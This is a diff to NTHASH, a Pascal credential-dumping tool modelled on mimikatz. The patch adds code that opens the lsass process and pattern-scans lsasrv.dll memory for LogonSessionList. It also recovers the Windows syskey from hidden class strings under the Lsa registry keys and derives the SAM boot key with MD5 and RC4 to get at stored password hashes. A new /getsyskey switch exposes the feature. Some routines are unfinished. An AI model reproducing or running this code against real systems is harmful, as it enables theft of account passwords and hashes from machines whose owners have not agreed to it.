@@ -3,7 +3,7 @@
 program NTHASH;
 
 uses windows,classes,sysutils,dos,
-     usamlib,usid, upsapi, uimagehlp, uadvapi32, utils, untdll, umemory;
+     usamlib,usid, upsapi, uimagehlp, uadvapi32, utils, untdll, umemory, ucryptoapi;
 
 type tdomainuser=record
      domain_handle:thandle;
@@ -865,7 +865,238 @@ begin
 
 end;
 
+function dumplogons(pid:dword;user:string):boolean;
+const
+  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  after:array[0..1] of byte=($eb,$04);
+  //after:array[0..1] of byte=($0F,$84);
+var
+  dummy:string;
+  hprocess,hmod:thandle;
+  hmods:array[0..1023] of thandle;
+  MODINFO:  MODULEINFO;
+  cbNeeded,count:	 DWORD;
+  szModName:array[0..254] of char;
+  addr:pointer;
+  offset_list:array[0..3] of byte;
+  offset_list_dword:dword;
+  read:cardinal;
+  offset:nativeint=0;
+  patch_pos:ShortInt=0;
+  pattern:tbytes;
+begin
+  if pid=0 then exit;
+  //if user='' then exit;
+  //
+  if (lowercase(osarch)='amd64') then
+     begin
+     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
+     patch_pos:=23;
+     end;
+  //x86 to do...
+  if patch_pos =0 then
+     begin
+     log('no patch mod for this windows version',1);
+     exit;
+     end;
+  log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  hprocess:=thandle(-1);
+  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                        false,pid);
+  if hprocess<>thandle(-1) then
+       begin
+       log('openprocess ok',0);
+       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
+       cbneeded:=0;
+       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
+               begin
+               log('EnumProcessModules OK',0);
 
+               for count:=0 to cbneeded div sizeof(thandle) do
+                   begin
+                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
+                      begin
+                      dummy:=strpas(szModName );
+                      if pos('lsasrv.dll',dummy)>0 then
+                         begin
+                         log('lsasrv.dll found:'+inttohex(hMods[count],8),0);
+                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
+                            begin
+                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
+                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
+                            addr:=MODINFO.lpBaseOfDll;
+                            pattern:=Init_Int_User_Info ;
+                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
+                            log('Searching...',0);
+                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,WN1703_LogonSessionList);
+                            log('Done!',0);
+                            if offset<>0 then
+                                 begin
+                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
+                                 //
+                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
+                                   begin
+                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
+                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword+4,4));
+                                   //we now should get a match with dd Lsasrv!LogonSessionList
+                                   log(inttohex(offset+offset_list_dword+4+patch_pos,sizeof(pointer)));
+
+                                   end; //if readmem
+                                 end;
+                            {//test - lets read first 4 bytes of our module
+                             //can be verified with process hacker
+                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
+                               begin
+                               log('ReadProcessMemory OK');
+                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
+                               end;
+                            }
+                            end;//if GetModuleInformation...
+                         end; //if pos('samsrv.dll',dummy)>0 then
+                      end; //if GetModuleFileNameExA
+                   end; //for count:=0...
+               end; //if EnumProcessModules...
+       closehandle(hprocess);
+       end;//if openprocess...
+
+end;
+
+
+function getclass(rootkey:hkey;keyname,valuename:string;var bytes:array of byte):boolean;
+var
+  ret:long;
+  hKeyReg,topKey,hSubKey:thandle;
+  dwDisposition:dword=0;
+  classSize:dword;
+  classStr:array [0..15] of widechar;
+  //bytes:array[0..3] of byte;
+  i:byte=0;
+begin
+result:=false;
+ret := RegCreateKeyEx(rootkey,pchar(keyName),0,nil,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,nil,topKey,@dwDisposition);
+if ret=error_success then
+  begin
+  if (RegOpenKeyEx(topKey,pchar(valueName),0,KEY_READ,hSubKey)=ERROR_SUCCESS) then
+    begin
+    classSize := 8+1;
+    fillchar(classStr ,sizeof(classStr ),0);
+    ret := RegQueryInfoKeyw(hSubKey,@classStr[0],@classSize,nil,nil,nil,nil,nil,nil,nil,nil,nil);
+    if (classSize=8) then
+      begin
+       while i<8 do
+             begin
+             bytes[i div 2]:=strtoint('$'+classStr[I]+classStr[i+1]);
+             inc(I,2);
+             end;
+       result:=true;
+       end;//if (classSize=8) then
+    RegCloseKey(hSubKey);
+    end;
+  RegCloseKey(topKey);
+  end;
+end;
+
+{*
+ * Get hidden syskey encoded bytes part in class string of a reg key
+ * (JD, Skew1, GBG, Data)
+ *}
+function get_encoded_syskey(var bytes:array of byte):boolean;
+var
+  i:byte;
+  enc_bytes:array[0..3] of byte;
+begin
+result:=false;
+//rootket=HKEY_LOCAL_MACHINE
+//keyname="SYSTEM\\CurrentControlSet\\Control\\Lsa"
+getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa','JD',enc_bytes);
+CopyMemory (@bytes[0],@enc_bytes[0],4);
+//for i:=0 to sizeof(enc_bytes)-1 do write(LeftPad (inttohex(enc_bytes[i],1),2)) ;
+getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa','Skew1',enc_bytes);
+CopyMemory (@bytes[4],@enc_bytes[0],4);
+//for i:=0 to sizeof(enc_bytes)-1 do write(LeftPad (inttohex(enc_bytes[i],1),2)) ;
+getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa','GBG',enc_bytes);
+CopyMemory (@bytes[8],@enc_bytes[0],4);
+//for i:=0 to sizeof(enc_bytes)-1 do write(LeftPad (inttohex(enc_bytes[i],1),2)) ;
+getclass (HKEY_LOCAL_MACHINE ,'SYSTEM\CurrentControlSet\Control\Lsa','Data',enc_bytes);
+CopyMemory (@bytes[12],@enc_bytes[0],4);
+//for i:=0 to sizeof(enc_bytes)-1 do write(LeftPad (inttohex(enc_bytes[i],1),2)) ;
+result:=true;
+end;
+
+//see kuhl_m_lsadump_getSamKey in kuhl_m_lsadump_getSamKey
+function gethashedbootkey(salt,samkey,syskey:array of byte;var bootkey:tbyte16):boolean;
+const
+  SAM_QWERTY:pchar='!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0';
+  SAM_NUM:pchar='0123456789012345678901234567890123456789\0';
+var
+  md5ctx:md5_ctx;
+  data:PCRYPTO_BUFFER; //= (SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey),
+  key:_CRYPTO_BUFFER; // = (MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest);
+  status:ntstatus;
+begin
+//based on the first byte of F
+//md5/rc4 on "old" ntlm
+MD5Init(md5ctx);
+	MD5Update(md5ctx,salt ,16); //F[0x70:0x80]=SALT
+	MD5Update(md5ctx,SAM_QWERTY,lstrlen(SAM_QWERTY)+1);
+	MD5Update(md5ctx,syskey,sizeof(syskey));
+	MD5Update(md5ctx,SAM_NUM,lstrlen(SAM_NUM)+1);
+	MD5Final(md5ctx); //rc4_key = MD5(F[0x70:0x80] + aqwerty + bootkey + anum)
+        data:=allocmem(sizeof(_CRYPTO_BUFFER));
+        data.Length :=SAM_KEY_DATA_KEY_LENGTH;
+        data.MaximumLength :=SAM_KEY_DATA_KEY_LENGTH;
+        data.Buffer :=samkey; //F[0x80:0xA0]=SAMKEY
+        key.Length:=MD5_DIGEST_LENGTH;
+        key.MaximumLength:=MD5_DIGEST_LENGTH;
+        key.Buffer:=md5ctx.digest ;
+        status:=RtlEncryptDecryptRC4(data,@key);
+        writeln(status);
+//we should cover AES/DES on new "ntlm"
+end;
+
+//also known as bootkey
+function getsyskey:boolean;
+const
+  syskeyPerm:array[0..15] of byte=($8,$5,$4,$2,$b,$9,$d,$3,$0,$6,$1,$c,$e,$a,$f,$7);
+var
+  salt,bytes:array[0..15] of byte;
+  syskey:array[0..15] of byte;
+  samkey:array[0..31] of byte;
+  i:byte;
+  ret:long;
+  topkey:thandle;
+  dwDisposition:dword=0;
+  sam:array[0..1023] of byte;
+  cbdata,lptype:dword;
+
+begin
+get_encoded_syskey(bytes);
+//for i:=0 to sizeof(bytes)-1 do write(LeftPad (inttohex(bytes[i],1),2)) ;
+//writeln;
+//Get syskey raw bytes
+for i:=0 to sizeof(bytes)-1 do syskey[i] := bytes[syskeyPerm[i]];
+for i:=0 to sizeof(syskey)-1 do write(LeftPad (inttohex(syskey[i],1),2)) ;
+exit; //for now
+writeln;
+//only if run as system
+ret := RegCreateKeyEx(HKEY_LOCAL_MACHINE ,pchar('SAM\sam\Domains\account'),0,nil,REG_OPTION_NON_VOLATILE,KEY_READ,nil,topKey,@dwDisposition);
+//ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SAM\sam\Domains\account',0, KEY_READ, topkey);
+if ret=0 then
+  begin
+  writeln('RegCreateKeyEx OK');
+  cbdata:=sizeof(sam);
+  //contains our salt and encrypted sam key
+  ret := RegQueryValueex (topkey,pchar('F'),nil,@lptype,@sam[0],@cbdata);
+  if ret=0 then
+     begin
+     writeln('RegQueryValue OK');
+     writeln(sam[0]);
+     end
+     else writeln(ret);
+  end;
+RegCloseKey(topkey);
+end;
 
 begin
   log('NTHASH 1.0 by erwan2212@gmail.com',1);
@@ -892,14 +1123,26 @@ begin
   log('NTHASH /getusers [/server:hostname]',1);
   log('NTHASH /getdomains [/server:hostname]',1);
   log('NTHASH /dumpsam',1);
+  log('NTHASH /getsyskey',1);
   log('NTHASH /runas /user:username /password:password',1);
   log('NTHASH /dumpprocess:pid',1);
   log('NTHASH /a_command /verbose',1);
   end;
-  //exit;
   //
   p:=pos('/verbose',cmdline);
   if p>0 then verbose:=true;
+  //
+  //logon list located in memory
+  //now need to get lsakeys to decrypt crdentials
+  //dumplogons (lsass_pid,'');
+  //exit;
+  //
+  p:=pos('/getsyskey',cmdline);
+  if p>0 then
+     begin
+     getsyskey;
+     exit;
+     end;
   p:=pos('/dumpprocess:',cmdline);
   if p>0 then
      begin
